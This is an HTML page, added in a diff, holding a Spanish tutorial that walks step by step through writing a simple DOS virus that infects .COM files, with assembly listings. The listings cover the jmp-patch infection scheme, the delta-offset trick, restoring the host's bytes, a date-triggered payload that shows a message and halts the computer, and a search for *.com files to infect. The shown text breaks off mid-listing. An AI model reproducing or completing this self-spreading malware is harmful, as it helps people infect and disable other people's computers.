@@ -1,0 +1,325 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="GENERATOR" content="Mozilla/4.51 [en] (Win98; I) [Netscape]">
+   <title> nEUrOtIc cpU. (Como hacer el primer virus.)</title>
+</head>
+<body text="#000000" bgcolor="#FFFFFF" link="#0000FF" vlink="#551A8B" alink="#FF0000">
+
+<pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Empezaremos por contaminar archivos com, &iquest;que qu&eacute; diferencia hay
+entre archivos com y exe? pues f&aacute;cil, si os hab&eacute;is fijado los archivos
+com ocupan como m&aacute;ximo 65 kbytes y pico. &iquest;qu&eacute; porque es as&iacute;? , pues porque
+los com se cargan en un &uacute;nico segmento de memoria. Y no me veng&aacute;is
+diciendo que el command.com del windows 95 tiene m&aacute;s porque aunque tiene
+extensi&oacute;n com es un archivo exe (es un exe camuflado je,je,je ;) )
+Los exe's utilizan un cabezera con informaci&oacute;n acerca del tama&ntilde;o del
+archivo,la posici&oacute;n inicial para empezar a ejecutar el file la posici&oacute;n
+del stack y dem&aacute;s choradas neces&aacute;rias para cargarlo en varios segmentos
+de memoria.El inicio de dicha cabecera es MZ &iquest;que porque esa marca?
+,yo que s&eacute; ,yo no cre&eacute; la estructura de los exe's, de alguna manera los
+ten&iacute;an que marcar.
+&nbsp;&nbsp;&nbsp;&nbsp; Bueno la verdad es que lo que realmente diferencia un
+exe de un com es esa marca , la extensi&oacute;n simplemente sirve para que
+el DOS sepa que ejecutar primero com->exe->bat.
+El virus que vamos a hacer no ser&aacute;&nbsp; residente&nbsp; por lo que
+es&nbsp; bastante sencillo .Contamina&nbsp; en un &uacute;nico directorio
+por lo que adem&aacute;s de ser sencillo tendr&aacute; una infecci&oacute;n practicamente
+pat&eacute;tica. Pero bueno es pa ke entend&aacute;is el rollo este de los com.
+La contaminaci&oacute;n de los com's se puede hacer a&ntilde;adiendo el c&oacute;digo del
+virus al principio del hoste(programa infectado) pero no es recomendable
+por cuestiones de rapidez, por lo que lo bonito es quitar los 3 primeros
+bytes del archivo (guardarlos en el c&oacute;digo del virus) poner en su lugar
+un jmp virus (es decir un salto incodicional al c&oacute;digo del virus, que&nbsp;
+lo a&ntilde;adimos al final del hoste).Cuando acaba la ejecuci&oacute;n del virus los
+3 bytes que hab&iacute;as guardado los restauramos al principio del virus y
+le pasamos el control al hoste. Facil noooo???
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------------
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | jmp&nbsp;&nbsp;&nbsp; virus&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------------
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | codigo del&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | hoste&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------------
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | virus:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | contamina&nbsp;&nbsp;&nbsp;&nbsp; |
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | recupera los&nbsp; |
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | 3 bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | originales y&nbsp; |
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | jmp hoste&nbsp;&nbsp;&nbsp;&nbsp; |
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------------
+
+&nbsp;&nbsp; Ahora que sabemos la teor&iacute;a , tenemos que buscar una manera
+&nbsp; de marcar&nbsp; los archivos para no volverlos a contaminar infinitas veces.
+&nbsp;&nbsp; Como vamos a tener que poner un jmp al principio del hoste , pues
+&nbsp;&nbsp; este propio jmp funcion&aacute;&nbsp; de marca de infecci&oacute;n. El virus infectar&aacute;&nbsp;
+&nbsp;&nbsp; a los archivos que no empiecen con un jmp.El c&oacute;digo del jmp ocupa&nbsp;
+&nbsp;&nbsp; 1 byte y la direcci&oacute;n a saltar con un byte ocupa 2 bytes
+&nbsp;&nbsp; 1 byte del jmp + 2 bytes direcci&oacute;n = 3 bytes (lo que pillamos del hoste)
+
+&nbsp;&nbsp; Otra cosa. Al programar un virus lo que se hace normalmente es crear
+&nbsp;&nbsp; un archivo contaminado, en este caso nuestro hoste contaminado
+&nbsp;&nbsp; contendr&aacute; un jmp start (salto al principio del virus) y la int 20h
+&nbsp;&nbsp; para regresar al dos.
+
+
+longitud&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; equ&nbsp;&nbsp;&nbsp;&nbsp; fin-start&nbsp;&nbsp;&nbsp;&nbsp;
+
+code&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; segment 'code'
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; assume&nbsp; cs:code,ds:code,es:code
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; org&nbsp;&nbsp;&nbsp;&nbsp; 100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;empiezo en 100 ya que es un com
+hoste:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;esto es un hoste simulado
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 20h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;con esto salgo al DOS
+start:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; bp
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; alli&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; busco la ip de inicio&nbsp;
+alli:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; bp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; para que la variables no
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; bp,offset alli&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; aparezcan corridas :-)
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Con esto lo que hacemos es definir la constante longitud como
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; la diferencia entre dos etiquetas que hemos puesto al principio y al
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; final del virus(obviamente) con lo que el linkador nos traducir&aacute;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; longitud como el tama&ntilde;o del virus.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; El org 100h es para que el programa se carge en el offset 100h,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; los com's siempre se cargan en el offset 100h ya que tienen que dejar
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 100h bytes para que el DOS guarde informaci&oacute;n sobre el programa
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esos 100h bytes forman lo que se llama el PSP.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; En el hoste meto un jmp start con lo que este archivo estar&aacute; ya
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; marcado como infectado.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ahora viene lo gracioso, que co&ntilde;o hace ese call ah&iacute;.Bueno &iquest;por qu&eacute;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; un call? &iquest;acaso los call no s&oacute;n para llamar a procedimientos?
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &iquest;y el procedimiento?&iquest;no veo ninguno?&iquest;y la famosa instrucci&oacute;n ret
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; para regresar del procedimiento tampoco la veo?
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Respuesta:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No es una llamada a un procedimiento. Es simplemente una pirula
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; para que se puedan direccionar las variables. &iquest;qu&eacute;eee?. Si bueno
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no s&eacute; si si os hab&eacute;is dado cuenta que el virus se a&ntilde;ade al final
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; del hoste con lo que en cada hoste las variables se encontrar&aacute;n
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; en diferente offset (el offset es una direcci&oacute;n dentro de un
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; segmento , y un segmento es un bloque de memoria de 65536 bytes)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Las referencias a variables ( como mov ax,variable)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; el linkador las traduce a un numero (mov ax,056f2h&nbsp; por ejemplo)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Por esto es por lo que hay que inventarse una pirula para hallar&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; el verdadero offset de las variables( en busca del offset perdido).
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ahora bien que os parece si sumamos a cada referencia a variable
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; el incremento del tama&ntilde;o del hoste respecto al hoste ficticio que hemos
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; creado,que lo&nbsp; podr&iacute;amos tener almacenado en un registro como el bp
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (que no es muy usado). Ahora las referencias a variables quedar&iacute;an as&iacute;:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,bp+variable&nbsp; ;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No est&aacute;&nbsp; mal el invento pero &iquest;c&oacute;mo co&ntilde;o hallamos ese incremento
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; que sufre&nbsp; el offset?.Ahora es cuando utilizamos las maravillosas
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cualidades del comando call.El comando call no s&oacute;lo salta al comienzo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; del procedimiento sin&oacute; que apila la direcci&oacute;n de regreso para que
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; luego utilizando la instrucci&oacute;n ret se pueda regresar a la posici&oacute;n
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; desde la que fu&eacute; llamada.Pero bueno, que preciosidad de comando
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ,pues yo ahora hago un call findoffset y en vez de enviar el control
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a un procedimiento utilizo el comando pop para desapilar la direcci&oacute;n
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; apilada con el call. Pero la cosa no se queda ah&iacute;, ahora le resto
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a esa direccion (almacenada en bp)&nbsp; el offset de la etiqueta findoffset
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ahora acabamos de obtener el desplazamiento que sufriran las variables.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NOTA:Las intrucci&oacute;nes offset algo el linkador las traduce por un&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; n&uacute;mero por lo que en cada archivo infectado 'offset findoffset'
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; siempre ser&aacute;&nbsp; el mismo n&uacute;mero.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; el offset de la etiqueta findoffset del archivo que vamos a crear.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Si te fijas en el archivo que vamos a obtener el bp tomar&aacute;&nbsp; el valor 0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esto es correcto ya que en el archivo original no se produce ningun
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; desplazamiento,respecto a su propio tama&ntilde;o ; ).
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; cs
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; cs
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; ds
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; es
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp; APILO LOS REGISTROS
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; di&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; si&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+&nbsp;&nbsp;&nbsp; Con esto ds y es se quedan con el valor de cs ya que trabajamos
+&nbsp;&nbsp;&nbsp; en un &uacute;nico segmento. Adem&aacute;s apilo los registros para que no
+&nbsp;&nbsp;&nbsp; se modifique su valor.
+
+&nbsp;&nbsp;&nbsp; Ahora viene un punto muy importante en este virus es recuperar
+&nbsp;&nbsp;&nbsp; los 3 bytes originales.Esto lo hacemos antes de la contaminaci&oacute;n
+&nbsp;&nbsp;&nbsp; ya que la variable cab_ORIG la sobreescribiremos en el proceso
+&nbsp;&nbsp;&nbsp; de infecci&oacute;n.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cld
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; cx,3d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;en cx el numero de bytes a mover
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; di,100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;muevo de ds:si ->es:di
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp; si,bp+cab_ORIG&nbsp;&nbsp;&nbsp;&nbsp; ;es decir de la variable cab_ORIG a 100h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rep&nbsp;&nbsp;&nbsp; movsb
+
+&nbsp;&nbsp;&nbsp; Ten en cuenta que sobreescribo estos 3 bytes en memoria el&nbsp;
+&nbsp;&nbsp;&nbsp; archivo contaminado siempre tendra tu jmp START.
+
+&nbsp; ************* Quien quiera pasar de esto que lo haga *******
+&nbsp;&nbsp;&nbsp; ************* es la activaci&oacute;n del virus&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *******
+
+&nbsp;&nbsp;&nbsp; Se activa el 19 de Febrero mi Cumplea&ntilde;os (que original).
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ah, 02h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp; 21h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp&nbsp; dh, 2d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;compruebo si el mes es 2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne&nbsp; noactivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp&nbsp; dl, 19d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;compruebo si el dia es 19
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne&nbsp; noactivo
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ax,0900h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;aparece el mensaje en pantalla
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp; dx,bp+mensaje&nbsp; ;si es 19 del 2 sino se salta a noactivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp; 21h
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hlt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;cuelgo el ordenata
+
+noactivo:
+
+&nbsp;&nbsp;&nbsp; ************* Final de la activaci&cent;n&nbsp; *************************
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ah,4eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; dx,bp+file_cont&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; cx,00000000b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;&nbsp;&nbsp; BUSQUEDA DEL ARCHIVO
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+
+&nbsp;&nbsp;&nbsp; con esto busco archivos que cumplan que tienen extensi&oacute;n com
+&nbsp;&nbsp;&nbsp; *.com . en ds:dx esta la direcci&oacute;n de la cadena '*.com'
+&nbsp;&nbsp;&nbsp; en ah la llamada a la funci&oacute;n de busqueda y en cx los atributos.
+&nbsp;&nbsp;&nbsp; Es recomendable trabajar con una buena lista de interrupciones
+&nbsp;&nbsp;&nbsp; yo recomiendo personalmente la lista de Ralf Brown yo dir&iacute;a que
+&nbsp;&nbsp;&nbsp; sin duda es la mejor .
+&nbsp;&nbsp;&nbsp;&nbsp; Si la han quitado la podr&eacute;is conseguir de la p&aacute;gina de Cicatrix.
+&nbsp;&nbsp;&nbsp; Ojo a que&nbsp; ponemos bp+file_cont en vez de file_cont a secas.
+
+otro:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; ah,4fh
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; 21h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jb&nbsp;&nbsp;&nbsp;&nbsp; salir&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;salto si no quedan m&aacute;s archivos
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;con extensi&oacute;n com
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ax, 3d00h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;abro el archivo para lectura
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dx, 009eh
